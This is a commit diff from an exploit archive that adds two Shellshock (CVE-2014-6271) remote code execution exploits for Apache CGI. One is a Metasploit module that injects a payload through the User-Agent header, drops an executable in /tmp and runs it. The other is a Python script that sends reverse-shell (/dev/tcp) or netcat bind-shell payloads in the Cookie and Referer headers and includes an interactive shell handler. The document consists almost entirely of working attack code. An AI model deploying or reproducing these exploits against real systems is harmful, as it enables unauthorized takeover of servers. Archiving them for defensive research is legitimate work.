8025a0f69b5d59ef0699f22c7c62acb8853c4833
Offensive Security <info@exploit-db.com>
2014-10-08 04:44:30 +0000

    Updated 10_08_2014

---
+++ platforms/cgi/webapps/34895.rb
@@ -0,0 +1,67 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::EXE
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Shellshock Bashed CGI RCE',
+      'Description'    => %q{
+          This module exploits the shellshock vulnerability in apache cgi. It allows you to
+        excute any metasploit payload you want.
+      },
+      'Author'         =>
+        [
+            'Stephane Chazelas',	# vuln discovery
+            'Fady Mohamed Osman'	# Metasploit module f.othman at zinad.net
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          [ 'CVE', '2014-6271' ]
+        ],
+      'Payload'	     =>
+        {
+          'BadChars' => "",
+        },
+        'Platform' => 'linux',
+        'Arch'		     => ARCH_X86,
+        'Targets'        =>
+        [
+          [ 'Linux x86', { 'Arch' => ARCH_X86, 'Platform' => 'linux' } ]
+        ],
+        'DefaultTarget'  => 0,
+        'DisclosureDate' => 'Aug 13 2014'))
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, 'The CGI url', '/cgi-bin/test.sh']) ,
+        OptString.new('FILEPATH', [true, 'The url ', '/tmp'])
+      ], self.class)
+  end
+
+  def exploit
+    @payload_name = "#{rand_text_alpha(5)}"
+    full_path = datastore['FILEPATH'] + '/' + @payload_name
+    payload_exe = generate_payload_exe
+    if payload_exe.blank?
+      fail_with(Failure::BadConfig, "#{peer} - Failed to generate the ELF, select a native payload")
+    end
+    peer = "#{rhost}:#{rport}"
+    print_status("#{peer} - Creating payload #{full_path}")
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri'    => datastore['TARGETURI'],
+      'agent'    => "() { :;}; /bin/bash -c \"" + "printf " + "\'" + Rex::Text.hexify(payload_exe).gsub("\n",'') + "\'" +  "> #{full_path}; chmod +x #{full_path};#{full_path};rm #{full_path};\""
+    })
+  end
+end
---
+++ platforms/linux/remote/34900.py
@@ -0,0 +1,146 @@
+#! /usr/bin/env python
+from socket import *
+from threading import Thread
+import thread, time, httplib, urllib, sys 
+
+stop = False
+proxyhost = ""
+proxyport = 0
+
+def usage():
+	print """
+
+		Shellshock apache mod_cgi remote exploit
+
+Usage:
+./exploit.py var=<value>
+
+Vars:
+rhost: victim host
+rport: victim port for TCP shell binding
+lhost: attacker host for TCP shell reversing
+lport: attacker port for TCP shell reversing
+pages:  specific cgi vulnerable pages (separated by comma)
+proxy: host:port proxy
+
+Payloads:
+"reverse" (unix unversal) TCP reverse shell (Requires: rhost, lhost, lport)
+"bind" (uses non-bsd netcat) TCP bind shell (Requires: rhost, rport)
+
+Example:
+
+./exploit.py payload=reverse rhost=1.2.3.4 lhost=5.6.7.8 lport=1234
+./exploit.py payload=bind rhost=1.2.3.4 rport=1234
+
+Credits:
+
+Federico Galatolo 2014
+"""
+	sys.exit(0)
+
+def exploit(lhost,lport,rhost,rport,payload,pages):
+	headers = {"Cookie": payload, "Referer": payload}
+	
+	for page in pages:
+		if stop:
+			return
+		print "[-] Trying exploit on : "+page
+		if proxyhost != "":
+			c = httplib.HTTPConnection(proxyhost,proxyport)
+			c.request("GET","http://"+rhost+page,headers=headers)
+			res = c.getresponse()
+		else:
+			c = httplib.HTTPConnection(rhost)
+			c.request("GET",page,headers=headers)
+			res = c.getresponse()
+		if res.status == 404:
+			print "[*] 404 on : "+page
+		time.sleep(1)
+		
+
+args = {}
+	
+for arg in sys.argv[1:]:
+	ar = arg.split("=")
+	args[ar[0]] = ar[1]
+try:
+	args['payload']
+except:
+	usage()
+	
+if args['payload'] == 'reverse':
+	try:
+		lhost = args['lhost']
+		lport = int(args['lport'])
+		rhost = args['rhost']
+		payload = "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/"+lhost+"/"+str(lport)+" 0>&1 &"
+	except:
+		usage()
+elif args['payload'] == 'bind':
+	try:
+		rhost = args['rhost']
+		rport = args['rport']
+		payload = "() { :;}; /bin/bash -c 'nc -l -p "+rport+" -e /bin/bash &'"
+	except:
+		usage()
+else:
+	print "[*] Unsupported payload"
+	usage()
+	
+try:
+	pages = args['pages'].split(",")
+except:
+	pages = ["/cgi-sys/entropysearch.cgi","/cgi-sys/defaultwebpage.cgi","/cgi-mod/index.cgi","/cgi-bin/test.cgi","/cgi-bin-sdb/printenv"]
+
+try:
+	proxyhost,proxyport = args['proxy'].split(":")
+except:
+	pass
+			
+if args['payload'] == 'reverse':
+	serversocket = socket(AF_INET, SOCK_STREAM)
+	buff = 1024
+	addr = (lhost, lport)
+	serversocket.bind(addr)
+	serversocket.listen(10)
+	print "[!] Started reverse shell handler" 
+	thread.start_new_thread(exploit,(lhost,lport,rhost,0,payload,pages,))
+if args['payload'] == 'bind':
+	serversocket = socket(AF_INET, SOCK_STREAM)
+	addr = (rhost,int(rport))
+	thread.start_new_thread(exploit,("",0,rhost,rport,payload,pages,))
+	
+buff = 1024
+	
+while True:
+	if args['payload'] == 'reverse':
+		clientsocket, clientaddr = serversocket.accept()
+		print "[!] Successfully exploited"
+		print "[!] Incoming connection from "+clientaddr[0]
+		stop = True
+		clientsocket.settimeout(3)
+		while True:
+			reply = raw_input(clientaddr[0]+"> ")
+			clientsocket.sendall(reply+"\n")
+			try:
+				data = clientsocket.recv(buff)
+				print data
+			except:
+				pass
+		
+	if args['payload'] == 'bind':
+		try:
+			serversocket = socket(AF_INET, SOCK_STREAM)
+			time.sleep(1)
+			serversocket.connect(addr)
+			print "[!] Successfully exploited"
+			print "[!] Connected to "+rhost
+			stop = True
+			serversocket.settimeout(3)
+			while True:
+				reply = raw_input(rhost+"> ")
+				serversocket.sendall(reply+"\n")
+				data = serversocket.recv(buff)
+				print data
+		except:
+			pass
